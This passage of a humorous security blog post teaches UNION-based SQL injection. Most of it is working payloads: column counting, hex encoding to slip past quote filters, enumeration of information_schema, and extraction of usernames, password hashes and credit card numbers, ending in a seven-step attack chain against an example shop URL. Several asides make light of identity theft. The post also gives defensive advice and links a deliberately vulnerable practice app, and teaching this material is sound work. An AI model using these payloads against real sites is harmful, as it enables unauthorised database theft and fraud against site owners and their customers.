                into one comma-separated string. Without it, we'd only see one table at a time. Efficiency matters, 
                even in cybercrime!
                </p>

                <p><strong>But wait!</strong> What if you can't use quotes around <code>'ecommerce_db'</code>? Maybe the application filters them out? Fear not—use HEX encoding!</p>

                <h4>HEX Encoding: When Quotes are Forbidden</h4>
                
                <p>Convert your string to hexadecimal and prefix it with <code>0x</code>:</p>
                
                <pre><code>'ecommerce_db' in hex = 65636f6d6d657263655f6462

Payload without quotes: -1' UNION SELECT 1, group_concat(table_name), 3 
                        FROM information_schema.tables 
                        WHERE table_schema=0x65636f6d6d657263655f6462--</code></pre>

                <p>MySQL interprets <code>0x65636f6d6d657263655f6462</code> as the string 'ecommerce_db'. No quotes needed! It's like speaking in code that only databases understand.</p>

                <p>Quick Python script to generate hex encoding:</p>
                <pre><code># Convert string to hex
db_name = "ecommerce_db"
hex_encoded = "0x" + db_name.encode('utf-8').hex()
print(hex_encoded)  # Output: 0x65636f6d6d657263655f6462</code></pre>

                <h4>Level 3: Extract Column Names</h4>
                
                <p>Now that we know table names, let's see what columns the juicy <code>users</code> table contains:</p>
                
                <pre><code>Payload: -1' UNION SELECT 1, group_concat(column_name), 3 
FROM information_schema.columns 
WHERE table_schema='ecommerce_db' 
AND table_name='users'--

Result displayed:
id,username,password,email,phone,address,credit_card_number</code></pre>

                <p>
                Notice the pattern? We just changed <code>table_name</code> to <code>column_name</code> in 
                our query and added a condition for the specific table. SQL injection: it's all about the patterns!
                </p>

                <p>With HEX encoding (if quotes are blocked):</p>
                <pre><code>Payload: -1' UNION SELECT 1, group_concat(column_name), 3 
FROM information_schema.columns 
WHERE table_schema=0x65636f6d6d657263655f6462 
AND table_name=0x7573657273--

Note: 'users' in hex = 0x7573657273</code></pre>

                <h4>Level 4: Extract Actual Data (The Grand Finale)</h4>
                
                <p>Now for the coup de grâce—extracting the actual user data:</p>
                
                <pre><code>Payload: -1' UNION SELECT 1, group_concat(username,0x3a,password), 3 
         FROM users--

Result displayed:
admin:5f4dcc3b5a,john:e99a18c428,alice:098f6bcd46,bob:482c811da5</code></pre>

                <p>
                The <code>0x3a</code> is the hex code for a colon (<code>:</code>). We're concatenating username and password 
                with a separator. It's like making a CSV file, except you're stealing it in real-time!
                </p>

                <p>Want it more organized? Extract specific users:</p>
                <pre><code>Payload: -1' UNION SELECT username, password, email FROM users--

Now you get each column in its own display field!</code></pre>

                <h3>Complete Attack Chain Example</h3>
                
                <p>Let's see the entire exploitation from start to finish with a real scenario:</p>
                
                <pre><code>Target URL: shop.example.com/product.php?id=5

Step 1 - Test for SQLi:
  → shop.example.com/product.php?id=5'
  → Error! SQL injection confirmed ✓

Step 2 - Find column count:
  → shop.example.com/product.php?id=5' ORDER BY 1--
  → shop.example.com/product.php?id=5' ORDER BY 2--
  → shop.example.com/product.php?id=5' ORDER BY 3--
  → shop.example.com/product.php?id=5' ORDER BY 4--  (ERROR)
  → Result: 3 columns ✓

Step 3 - Test UNION:
  → shop.example.com/product.php?id=-5' UNION SELECT NULL,NULL,NULL--
  → Success! UNION works ✓

Step 4 - Get database name:
  → shop.example.com/product.php?id=-5' UNION SELECT 1,database(),3--
  → Result: "shop_database" ✓

Step 5 - Get table names:
  → shop.example.com/product.php?id=-5' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='shop_database'--
  → Result: "users,products,orders,payments" ✓

Step 6 - Get column names from users table:
  → shop.example.com/product.php?id=-5' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='shop_database' AND table_name='users'--
  → Result: "id,username,password,email,role" ✓

Step 7 - Extract user data:
  → shop.example.com/product.php?id=-5' UNION SELECT 1,group_concat(username,0x3a,password,0x3a,role),3 FROM users--
  → Result: "admin:$2a$10$...:admin,user1:md5hash:user,user2:md5hash:user"
  → MISSION ACCOMPLISHED! ✓</code></pre>

                <p>And there you have it—complete database compromise through UNION-based SQL injection. From zero to hero (or villain, depending on your perspective) in 7 steps!</p>

                <h3>Why This Method Works So Well</h3>
                
                <ul>
                    <li><strong>Fast:</strong> Extract massive amounts of data in single requests</li>
                    <li><strong>Visible:</strong> Results appear directly in the application's output</li>
                    <li><strong>Systematic:</strong> Follow a repeatable process every time</li>
                    <li><strong>Adaptable:</strong> Use HEX encoding when quotes are filtered</li>
                    <li><strong>Complete:</strong> Get database structure AND data</li>
                </ul>

                <h3>Detection Phase: Finding the Number of Columns (Alternative Methods)</h3>
                
                <p>Already covered ORDER BY, but here's the NULL technique for completeness:</p>

                <h4>Method 2: UNION SELECT NULL Technique</h4>
                
                <p>Add NULL columns until the query succeeds:</p>
                <pre><code>' UNION SELECT NULL--                    (error)
' UNION SELECT NULL, NULL--              (error)
' UNION SELECT NULL, NULL, NULL--        (success!)</code></pre>

                <p>Using NULL is clever because it's compatible with all data types. It's the Swiss Army knife of SQL values!</p>

                <h3>Exploration Phase: Discovering the Database Structure</h3>
                
                <p>
                Now that you know how many columns exist and that UNION works, it's time to map out the database like a digital cartographer. 
                This is reconnaissance—gathering intelligence before the heist!
                </p>

                <h4>Finding Which Columns Accept String Data</h4>
                <p>Not all columns can display text. Some are numeric, some are dates. We need to find the text-friendly columns:</p>
                <pre><code>' UNION SELECT 'test', NULL, NULL--      (success - column 1 accepts strings!)
' UNION SELECT NULL, 'test', NULL--      (error - column 2 is numeric)
' UNION SELECT NULL, NULL, 'test'--      (success - column 3 accepts strings!)</code></pre>

                <p>Result: Columns 1 and 3 are string-compatible. These are our data extraction highways! Column 2 is numeric-only, so we'll just put numbers there.</p>

                <h4>Why This Matters</h4>
                <p>We just discovered that our injection query must follow this pattern:</p>
                <pre><code>' UNION SELECT [string], [number], [string]--</code></pre>
                
                <p>Now we know exactly how to structure our data extraction queries. It's like getting the blueprint before robbing the bank!</p>

                <h3>Exploitation Phase: The Data Heist</h3>
                
                <p>Now that you've mapped the database structure, it's time to actually steal the data. This is where exploration becomes exploitation!</p>

                <h4>Basic Data Extraction</h4>
                <p>Extract data using those string-compatible columns you identified:</p>
                <pre><code>' UNION SELECT username, NULL, password FROM ecommerce.users--</code></pre>

                <p>The results appear mixed with the original query results. It's like hiding stolen goods in plain sight!</p>

                <h4>Targeting Specific Records</h4>
                <p>Want admin accounts specifically? Add a WHERE clause:</p>
                <pre><code>' UNION SELECT username, NULL, password FROM ecommerce.users WHERE role='admin'--</code></pre>

                <p>Why waste time on regular users when you can go straight for the admins?</p>

                <h4>Extracting from Multiple Tables</h4>
                <p>Combine data from different tables for maximum impact:</p>
                <pre><code>' UNION SELECT u.username, NULL, c.card_number FROM ecommerce.users u JOIN ecommerce.credit_cards c ON u.user_id=c.user_id--</code></pre>

                <p>Now you have usernames matched with credit card numbers. Identity theft has never been more convenient!</p>

                <h4>Counting Records</h4>
                <p>How much data can you steal? Let's find out:</p>
                <pre><code>' UNION SELECT COUNT(*), NULL, NULL FROM ecommerce.users--</code></pre>

                <p>15,000 users? That's a lot of potential victims... er, I mean "data points for your security report."</p>

                <h3>Advanced UNION Tricks</h3>

                <h4>Concatenation for Limited Columns</h4>
                <p>If only one column accepts strings, combine multiple values:</p>
                <pre><code>' UNION SELECT NULL, CONCAT(username,':',password), NULL FROM users--</code></pre>

                <h4>Filtering Your Results</h4>
                <p>Make the original query return nothing so only your data shows:</p>
                <pre><code>' AND 1=0 UNION SELECT username, NULL, password FROM users--</code></pre>

                <p>The <code>AND 1=0</code> ensures the original query returns no rows. Sneaky!</p>

                <h4>Multiple Row Extraction</h4>
                <p>In MySQL, use GROUP_CONCAT to get all rows at once:</p>
                <pre><code>' UNION SELECT NULL, GROUP_CONCAT(username,':',password), NULL FROM users--</code></pre>

                <p>One query, entire table. Efficiency at its finest!</p>

                <h3>Why UNION Injection is Popular</h3>
                <ul>
                    <li>Fast - extract large amounts of data quickly</li>
                    <li>Visible - results appear in the application response</li>
                    <li>Flexible - can access any table/column</li>
                    <li>Reliable - works when output is displayed</li>
                </ul>

                <p>It's the sports car of SQL injection techniques. Fast, flashy, and gets you where you want to go!</p>

                <h2>Training Ground: Because Theory Without Practice is Just Philosophy</h2>
                
                <p>Want to actually understand SQL injection instead of just reading about it? Of course you do! (Your future self will thank you.)</p>
                
                <p>
                Head over to the <strong>appsecco/sqlinjection_training_app</strong> repository on GitHub. It's a deliberately vulnerable 
                application designed for learning SQL injection techniques in a safe, legal environment. No actual databases were harmed 
                in the making of this training app.
                </p>
    
                <p>The repository provides hands-on experience with:</p>
                <ul>
                    <li>Different types of SQL injection vulnerabilities</li>
                    <li>Various exploitation techniques</li>
                    <li>Real-world scenarios (minus the real-world consequences)</li>
                    <li>A guilt-free environment to break things</li>
                    <li>Practice with information_schema enumeration</li>
                    <li>UNION-based injection techniques</li>
                    <li>Blind SQL injection challenges</li>
                </ul>
                
                <p>
                Remember: Only practice on systems you own or have explicit permission to test. Testing SQL injection on production 
                systems without authorization is illegal, unethical, and a great way to make new friends in the legal system.
                </p>

                <h2>Conclusion: The Gift That Keeps on Giving</h2>
                
                <p>
                SQL injection has been around longer than some developers have been alive, yet it remains in OWASP's Top 10. It's almost 
                impressive how we, as a community, have managed to keep this vulnerability alive and thriving for decades.
                </p>
                
                <p>The solution is simple:</p>
                <ul>
                    <li>Use parameterized queries (notice how this keeps coming up?)</li>
                    <li>Use prepared statements</li>
                    <li>Use ORMs correctly (they're not magic—you can still mess up!)</li>
                    <li>Validate input</li>
                    <li>Apply principle of least privilege</li>
                    <li>Never, EVER concatenate user input into SQL queries</li>
                </ul>
                
                <p>
                These are all things mentioned in every security tutorial ever written. But hey, if following basic security practices 
                was easy, we wouldn't need articles like this one, would we?
                </p>

                <p>Now go forth and write secure code. Or at least try. The cybersecurity industry is counting on you to keep failing so they stay employed!</p>

                <hr>
                
                <p><small><em>
                Disclaimer: This article is intended for educational purposes only. SQL injection is illegal when performed without authorization. 
                Always practice on systems you own or have explicit permission to test. The author is not responsible for any misuse of this 
                information, though they will judge you silently. Remember: with great power comes great responsibility, and also potential 
                felony charges.
                </em></small></p>
                </div>
            </article>
            <a href="../index.html" class="back-link">← Back to all posts</a>
        </div>
    </main>
    <footer>
        <div class="container">
            <p>&copy; 2025 Caspian | Built with &lt;code&gt; and ☕</p>
        </div>
    </footer>
</body>
</html>
